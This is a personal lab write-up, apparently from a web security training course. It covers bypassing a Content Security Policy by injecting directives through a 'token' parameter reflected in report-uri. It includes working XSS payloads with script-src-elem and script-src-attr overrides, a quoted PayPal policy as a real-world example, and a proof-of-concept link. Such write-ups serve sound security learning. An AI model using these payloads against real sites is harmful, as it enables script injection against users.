# Lab: Reflected XSS protected by CSP, with CSP bypass

## Objective:

- Find a way to bypass the CSP policy and show an alert using XSS.

## Key Concepts:

- **report-uri** is a directive that usually reflects user entered value at some
  place.
- **report-uri** directive is usually always at the last of the CSP directives.
- If you can get hold of how the value of this directive is being set by user,
  you can inject new policies.
- Its not possible to override existing directives with new ones.
- Recent versions of Chrome introduced a new directive **script-src-elem** ,
  which controls the **script** elements but not events.
- **script-src-elem** directive override existing **script-src** directives.
- For **script-src-elem** directive, any **script** tag will be blocked, but
  execution of javascript through an even handler will be allowed:

```html
Content-Security-Policy: script-src-elem 'none'; script-src-attr 'unsafe-inline'
```

```javascript
<script>alert("This will be blocked")</script>
<a href="#" onclick="alert('This will be allowed')">test</a>
```

**allowing javascript execution using inline script tags**

```html
Content-Security-Policy: script-src-elem 'unsafe-inline';
```

```javascript
<script>alert("This will be allowed")</script>
<a href="#" onclick="alert('This will be blocked')">test</a>
```

## Steps Taken:

1. Understand the different ways to exploit the CSP.
2. Analyse if in the CSP content, there is any **report-uri** directive usually
   in the last.
3. Analyze the directive value is an endpoint followed up by a query parameter
   **token**,

```html
Content-Security-Policy: default-src 'self'; object-src 'none';script-src
'self'; style-src 'self'; report-uri /csp-report?token=
```

4. Try passing a key value pair of **token=[some value]** in the web url and
   observe the response CSP content.

5. Use ;[space] to add a new directive after the **report-uri** directive.
6. append directive **script-src-elem** to override **script-src** directive and
   allow javascript inline executio using **script** tag or **script-src-attr**
   to allow javascript inline execution from an attribute.
7. use the script tag or attribute

## Payloads Used:

**execute javascript from script tag**

```html
?token=anything; script-src-elem 'unsafe-inline'; &search=
<script>
  alert(1);
</script>
```

```html
?search=
<script>
  alert(1);
</script>
&token=anything; script-src-elem 'unsafe-inline';
```

**execute javascript from attribute**

```html
?token=anything; script-src-attr 'unsafe-inline'; &search=
<img
  src="0"
  onerror="alert(1)" />
```

```html
?search=
<img
  src="0"
  onerror="alert(1)" />&token=anything; script-src-attr 'unsafe-inline';
```

## Issues Encountered:

- Issue while inserting token query parameter along with the search one.
- Was only trying with **script-src-elem** directive set to **none**, and was
  using the payload of **script-src-attr**

## Solutions/Workarounds:

- Use burp repeater and update the parameters using the request parameters
  section and convert to URL encoding to avoid breaking the URL.

## Takeaways:

- Edge handles the CSP directives differently, if we can make the directive
  syntax error like inserting **:\_** it will be an invalid directive syntax.
  And edge will no longer follow the CSP.
- Try to find any value in a directive where, even if any partial content can be
  set by user, then we can try manipulating it. For example, paypal used to put
  a get parameter called **token** inside **report-uri** directive.
- if you can find any key value pair in the **report-uri** in format **key=**
  then try to set a value using query parameters.

```html
Content-Security-Policy: default-src 'self' https://*.paypal.com
https://*.paypal.com:* https://*.paypalobjects.com 'unsafe-eval';connect-src
'self' https://*.paypal.com https://nexus.ensighten.com
https://*.paypalobjects.com;frame-src 'self' https://*.paypal.com
https://*.paypalobjects.com https://*.cardinalcommerce.com;script-src
https://*.paypal.com https://*.paypalobjects.com 'unsafe-inline'
'unsafe-eval';style-src 'self' https://*.paypal.com https://*.paypalobjects.com
'unsafe-inline';img-src https: data:;object-src 'none'; report-uri
/webapps/xoonboarding/api/log/csp?token=SOMETOKEN;_
```

## Useful Links

[Bypassing CSP with policy injection - article](https://portswigger.net/research/bypassing-csp-with-policy-injection)
[Chrome CSP bypass using policy injection - POC ](https://portswigger-labs.net/edge_csp_injection_xndhfye721/?x=%3Bscript-src-elem+*&y=%3Cscript+src=%22https://subdomain1.portswigger-labs.net/xss/xss.js%22%3E%3C/script%3E)
